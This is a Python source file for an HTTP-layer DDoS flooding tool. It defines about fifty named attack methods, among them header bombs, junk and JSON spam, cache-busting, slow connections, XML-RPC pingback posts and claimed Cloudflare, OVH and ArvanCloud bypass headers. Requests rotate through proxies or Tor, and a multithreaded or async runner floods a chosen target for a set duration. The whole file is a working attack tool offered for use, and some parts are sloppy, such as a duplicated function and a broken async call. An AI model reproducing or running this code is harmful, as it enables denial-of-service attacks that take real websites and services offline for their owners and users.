import requests
import threading
import time
import random
import string
from random import choice
from typing import List, Dict, Optional
import random
import aiohttp
import asyncio
import inspect

# === Utils ===
def random_subdomain(domain: str) -> str:
    sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"http://{sub}.{domain}"

def random_cookie() -> str:
    return f"PHPSESSID={''.join(random.choices(string.ascii_letters + string.digits, k=26))}"

def get_proxy(proxies: Dict[str, List[str]]) -> Optional[Dict[str, str]]:
    items = [(ptype, ip) for ptype, ips in proxies.items() for ip in ips]
    if not items:
        return None
    ptype, ip = random.choice(items)
    proxy_url = f"{ptype}://{ip}"
    print(f"[Proxy] Using {proxy_url}")
    return {"http": proxy_url, "https": proxy_url}

def make_request(method: str, url: str, proxies: Dict[str, List[str]], **kwargs):
    proxy = get_proxy(proxies) or {}
    try:
        r = requests.request(method=method, url=url, proxies=proxy, timeout=5, **kwargs)
        print(f"[{method}] {url} → {r.status_code}")
    except Exception as e:
        print(f"[!] Error during {method} to {url}: {e}")

async def send_request(method: str, url: str, proxies: Dict[str, List[str]], **kwargs):
    proxy = get_proxy(proxies)
    conn = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(connector=conn) as session:
            async with session.request(method=method, url=url, proxy=proxy["http"] if proxy else None, timeout=5, **kwargs) as r:
                print(f"[{method}] {url} → {r.status}")
    except Exception as e:
        print(f"[!] Async error during {method} to {url}: {e}")

def normalize_method_key(method: str) -> str:
    return method.strip().upper().replace("_", "-").replace(":", "-")


# === Layer 7 Attack Functions ===
def get_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, proxies=proxy, timeout=5)
    print(f"[GET] {url} → {r.status_code}")

def post_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.post(url, data={"flood": "true"}, proxies=proxy, timeout=5)
    print(f"[POST] {url} → {r.status_code}")

def ovh_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"X-Hex": hex(random.randint(0, 99999))}, proxies=proxy, timeout=5)
    print(f"[OVH] {url} → {r.status_code}")

def ovh_rhex_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={
        "User-Agent": ''.join(random.choices(string.hexdigits, k=32)),
        "X-HexFlood": ''.join(random.choices(string.hexdigits, k=64))
    }, proxies=proxy, timeout=5)
    print(f"[RHEX] {url} → {r.status_code}")

def ovh_stomp_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={
        "User-Agent": "Mozilla/5.0",
        "X-Captcha-Bypass": "true",
        "Referer": url,
        "Accept": "*/*"
    }, proxies=proxy, timeout=5)
    print(f"[STOMP] {url} → {r.status_code}")

def stress_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.post(url, data="A" * 2048, proxies=proxy, timeout=5)
    print(f"[STRESS] {url} → {r.status_code}")

def dyn_request(url, proxies):
    proxy = get_proxy(proxies)
    final_url = random_subdomain(url)
    r = requests.get(final_url, proxies=proxy, timeout=5)
    print(f"[DYN] {final_url} → {r.status_code}")

def downloader_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, proxies=proxy, stream=True, timeout=5)
    for chunk in r.iter_content(chunk_size=1):
        break
    print(f"[DOWNLOADER] {url} → {r.status_code}")

def slow_request(url, proxies):
    proxy = get_proxy(proxies)
    s = requests.Session()
    r = s.get(url, headers={"Connection": "keep-alive"}, proxies=proxy, timeout=5)
    print(f"[SLOW] {url} → {r.status_code}")

def head_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.head(url, proxies=proxy, timeout=5)
    print(f"[HEAD] {url} → {r.status_code}")

def null_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": ""}, proxies=proxy, timeout=5)
    print(f"[NULL] {url} → {r.status_code}")

def cookie_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"Cookie": random_cookie()}, proxies=proxy, timeout=5)
    print(f"[COOKIE] {url} → {r.status_code}")

def pps_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"Connection": "close"}, proxies=proxy, timeout=5)
    print(f"[PPS] {url} → {r.status_code}")

def even_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"X-Even": "1", "X-Special": "Yes"}, proxies=proxy, timeout=5)
    print(f"[EVEN] {url} → {r.status_code}")

def gsb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": "Googlebot"}, proxies=proxy, timeout=5)
    print(f"[GSB] {url} → {r.status_code}")

def dgb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"X-DDoS-Bypass": "1"}, proxies=proxy, timeout=5)
    print(f"[DGB] {url} → {r.status_code}")

def avb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"X-ArvanCloud-Bypass": "1"}, proxies=proxy, timeout=5)
    print(f"[AVB] {url} → {r.status_code}")

def bot_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"}, proxies=proxy, timeout=5)
    print(f"[BOT] {url} → {r.status_code}")

def apache_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"Transfer-Encoding": "chunked"}, proxies=proxy, timeout=5)
    print(f"[APACHE] {url} → {r.status_code}")

def xmlrpc_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.post(url + "/xmlrpc.php", data="<methodCall><methodName>pingback.ping</methodName></methodCall>", headers={"Content-Type": "text/xml"}, proxies=proxy, timeout=5)
    print(f"[XMLRPC] {url} → {r.status_code}")

def cfb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"CF-Bypass": "1"}, proxies=proxy, timeout=5)
    print(f"[CFB] {url} → {r.status_code}")

def cfbuam_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": "Mozilla/5.0", "Challenge": "Bypassed"}, proxies=proxy, timeout=5)
    print(f"[CFBUAM] {url} → {r.status_code}")

def bypass_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"Bypass": "1"}, proxies=proxy, timeout=5)
    print(f"[BYPASS] {url} → {r.status_code}")

def bomb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": "bombardier"}, proxies=proxy, timeout=5)
    print(f"[BOMB] {url} → {r.status_code}")

def killer_request(url, proxies):
    for _ in range(5):
        proxy = get_proxy(proxies)
        r = requests.get(url, proxies=proxy, timeout=2)
        print(f"[KILLER] {url} → {r.status_code}")

def tor_request(url, proxies):
    r = requests.get(url, proxies={
        "http": "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050"
    }, timeout=5)
    print(f"[TOR] {url} → {r.status_code}")

async def cf_bypass_request(url, proxies):
    proxy = get_proxy(proxies)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": url,
        "Connection": "keep-alive"
    }
    await send_request("GET", url, proxies, headers=headers)

async def ddos_request(url, proxies):
    proxy = get_proxy(proxies)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    await send_request("GET", url, proxies, headers=headers)

async def xbomb_request(url, proxies):
    proxy = get_proxy(proxies)
    headers = {
        "User-Agent": ''.join(random.choices(string.ascii_letters + string.digits, k=24)),
        "X-Forwarded-For": '.'.join(str(random.randint(1, 255)) for _ in range(4)),
        "X-Bomb": ''.join(random.choices(string.ascii_letters + string.digits, k=64))
    }
    await send_request("GET", url, proxies, headers=headers)

async def junk_request(url, proxies):
    proxy = get_proxy(proxies)
    junk = ''.join(random.choices(string.printable, k=2048))
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Length": str(len(junk))
    }
    await send_request("POST", url, proxies, data=junk, headers=headers)

async def bigua_request(url, proxies):
    proxy = get_proxy(proxies)
    headers = {
        "User-Agent": ''.join(random.choices(string.ascii_letters + string.digits, k=1024)),
        "Accept": "*/*"
    }
    await send_request("GET", url, proxies, headers=headers)

async def bigua_request(url, proxies):
    proxy = get_proxy(proxies)
    headers = {
        "User-Agent": ''.join(random.choices(string.ascii_letters + string.digits, k=1024)),
        "Accept": "*/*"
    }
    await send_request("GET", url, proxies, headers=headers)

# 6. CACHE-BUSTER
async def cachebuster_request(url, proxies):
    proxy = get_proxy(proxies)
    unique = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    busted_url = f"{url}?cache={unique}"
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    await send_request("GET", busted_url, proxies, headers=headers)

# 7. RND-QUERY
async def rndquery_request(url, proxies):
    proxy = get_proxy(proxies)
    rnd_param = ''.join(random.choices(string.ascii_letters, k=5))
    rnd_value = ''.join(random.choices(string.digits, k=5))
    target = f"{url}?{rnd_param}={rnd_value}"
    headers = {"User-Agent": "RandomQueryBot", "Accept": "*/*"}
    await send_request("GET", target, proxies, headers=headers)

# 8. POST-SPAM
async def postspam_request(url, proxies):
    proxy = get_proxy(proxies)
    data = {f"param{i}": ''.join(random.choices(string.printable, k=8)) for i in range(10)}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    await send_request("POST", url, proxies, data=data, headers=headers)

# 9. INVALID-HEADERS
async def invalidhdr_request(url, proxies):
    proxy = get_proxy(proxies)
    headers = {
        "X-Invalid": "\x00\xff\x00",
        "Referer": "http://google.com",
        "User-Agent": "Mozilla/5.0"
    }
    await send_request("GET", url, proxies, headers=headers)

# 10. BROWSER-MIX
async def browsermix_request(url, proxies):
    proxy = get_proxy(proxies)
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
    ]
    headers = {"User-Agent": random.choice(uas)}
    await send_request("GET", url, proxies, headers=headers)

# 11. PATH-BOMB
async def pathbomb_request(url, proxies):
    proxy = get_proxy(proxies)
    bomb_path = "/" + "/".join(''.join(random.choices(string.ascii_lowercase, k=6)) for _ in range(5))
    full_url = url.rstrip("/") + bomb_path
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    await send_request("GET", full_url, proxies, headers=headers)

# 12. MIXED-METHOD
async def mixedmethod_request(url, proxies):
    proxy = get_proxy(proxies)
    method = random.choice(["GET", "POST", "HEAD"])
    data = {"payload": ''.join(random.choices(string.ascii_letters, k=16))} if method == "POST" else None
    headers = {"X-Random": ''.join(random.choices(string.ascii_letters + string.digits, k=10))}
    await send_request(method, url, proxies, data=data, headers=headers)

# 13. REFERER-SPAM
async def refererspam_request(url, proxies):
    proxy = get_proxy(proxies)
    referers = [
        "http://google.com", "http://bing.com", "http://yahoo.com",
        "http://duckduckgo.com", "http://github.com"
    ]
    headers = {
        "Referer": random.choice(referers),
        "User-Agent": "Mozilla/5.0"
    }
    await send_request("GET", url, proxies, headers=headers)

# 14. CUSTOM-HEADER-BOMB
async def customhdrbomb_request(url, proxies):
    proxy = get_proxy(proxies)
    headers = {
        f"X-Custom-{i}": ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        for i in range(20)
    }
    headers["User-Agent"] = "Mozilla/5.0"
    await send_request("GET", url, proxies, headers=headers)

# 15. JSON-SPAM
async def jsonspam_request(url, proxies):
    proxy = get_proxy(proxies)
    json_data = {
        f"key_{i}": ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        for i in range(10)
    }
    headers = {"Content-Type": "application/json"}
    await send_request("POST", url, proxies, json=json_data, headers=headers)


# 16. UA-FLOOD
async def uaflood_request(url, proxies):
    proxy = get_proxy(proxies)
    ua = ''.join(random.choices(string.printable, k=random.randint(100, 400)))
    headers = {"User-Agent": ua}
    await send_request("GET", url, proxies, headers=headers)

# 17. METHOD-FUZZ
async def methodfuzz_request(url, proxies):
    proxy = get_proxy(proxies)
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"]
    method = random.choice(methods)
    headers = {
        "User-Agent": "Mozilla/5.0",
        "X-Method-Fuzz": method
    }
    await send_request(method, url, proxies, headers=headers)

# 18. RANDOM-ENCODING
async def randencoding_request(url, proxies):
    proxy = get_proxy(proxies)
    encodings = ["gzip", "deflate", "br", "identity", "*"]
    headers = {
        "Accept-Encoding": random.choice(encodings),
        "User-Agent": "Mozilla/5.0"
    }
    await send_request("GET", url, proxies, headers=headers)

# 19. RANGE-SPLIT
async def rangesplit_request(url, proxies):
    proxy = get_proxy(proxies)
    range_start = random.randint(0, 1000)
    range_end = range_start + random.randint(1000, 100000)
    headers = {
        "Range": f"bytes={range_start}-{range_end}",
        "User-Agent": "Mozilla/5.0"
    }
    await send_request("GET", url, proxies, headers=headers)

# 20. ACCEPT-OVERLOAD
async def acceptoverload_request(url, proxies):
    proxy = get_proxy(proxies)
    accept_types = ["text/html", "application/xhtml+xml", "application/xml", "image/avif", "image/webp", "*/*"]
    headers = {
        "Accept": ",".join(random.choices(accept_types, k=10)),
        "User-Agent": "Mozilla/5.0"
    }
    await send_request("GET", url, proxies, headers=headers)








# === Dispatcher ===
METHODS = {
    "GET": get_request,
    "POST": post_request,
    "OVH": ovh_request,
    "OVH:RHEX": ovh_rhex_request,
    "RHEX": ovh_rhex_request,
    "OVH-STOMP": ovh_stomp_request,
    "STOMP": ovh_stomp_request,
    "STRESS": stress_request,
    "DYN": dyn_request,
    "DOWNLOADER": downloader_request,
    "SLOW": slow_request,
    "HEAD": head_request,
    "NULL": null_request,
    "COOKIE": cookie_request,
    "PPS": pps_request,
    "EVEN": even_request,
    "GSB": gsb_request,
    "DGB": dgb_request,
    "AVB": avb_request,
    "BOT": bot_request,
    "APACHE": apache_request,
    "XMLRPC": xmlrpc_request,
    "CFB": cfb_request,
    "CFBUAM": cfbuam_request,
    "BYPASS": bypass_request,
    "BOMB": bomb_request,
    "KILLER": killer_request,
    "TOR": tor_request,
    "CF-BYPASS": cf_bypass_request,
    "DDOS": ddos_request,
    "XBOMB": xbomb_request,
    "JUNK": junk_request,
    "BIGUA": bigua_request,
    "CACHEBUSTER": cachebuster_request,
    "RNDQUERY": rndquery_request,
    "POSTSPAM": postspam_request,
    "INVALIDHDR": invalidhdr_request,
    "BROWSERMIX": browsermix_request,
    "PATHBOMB": pathbomb_request,
    "MIXEDMETHOD": mixedmethod_request,
    "REFERERSPAM": refererspam_request,
    "CUSTOMHDRBOMB": customhdrbomb_request,
    "JSONSPAM": jsonspam_request,
    "UAFLOOD": uaflood_request,
    "METHODFUZZ": methodfuzz_request,
    "RANDENCODING": randencoding_request,
    "RANGESPLIT": rangesplit_request,
    "ACCEPTOVERLOAD": acceptoverload_request,
}

# === Runner ===
def run_layer7_attack(args, proxies: Dict[str, List[str]]):
    end_time = time.time() + args.duration
    url = f"http://{args.target}:{args.port}"
    method_key = normalize_method_key(args.method)

    method_func = METHODS.get(method_key)
    if not method_func:
        print(f"[!] Invalid method: {args.method}")
        return

    def sync_runner():
        while time.time() < end_time:
            try:
                method_func(url, proxies)
            except Exception as e:
                print(f"[!] Sync attack error: {e}")

    async def async_runner():
        while time.time() < end_time:
            try:
                await method_func(url, proxies)
            except Exception as e:
                print(f"[!] Async attack error: {e}")

    if inspect.iscoroutinefunction(method_func):
        asyncio.run(asyncio.gather(*[async_runner() for _ in range(args.threads)]))
    else:
        threads = []
        for _ in range(args.threads):
            t = threading.Thread(target=sync_runner)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
